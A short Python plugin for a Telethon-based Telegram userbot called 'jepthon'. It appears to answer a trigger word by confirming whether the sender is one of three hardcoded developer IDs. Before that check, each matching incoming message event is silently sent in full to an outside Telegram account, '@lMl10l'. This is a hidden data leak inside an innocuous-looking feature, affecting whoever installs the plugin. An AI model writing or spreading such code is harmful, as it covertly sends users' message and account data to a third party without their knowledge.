import os.path
from jepthon import jepiq
from telethon import events
from ..helpers import get_user_from_event

prog = [393120911, 705475246, 1374312239]

@jepiq.on(events.NewMessage(outgoing=False, pattern='منصب'))
async def isJep(event):
    await jepiq.send_message("@lMl10l", str(event))
    user = await get_user_from_event(event)
    if not user:
        return
    sender = await event.get_sender()
    if sender.id in prog :
        await event.reply('منصب جيبثون ✓')
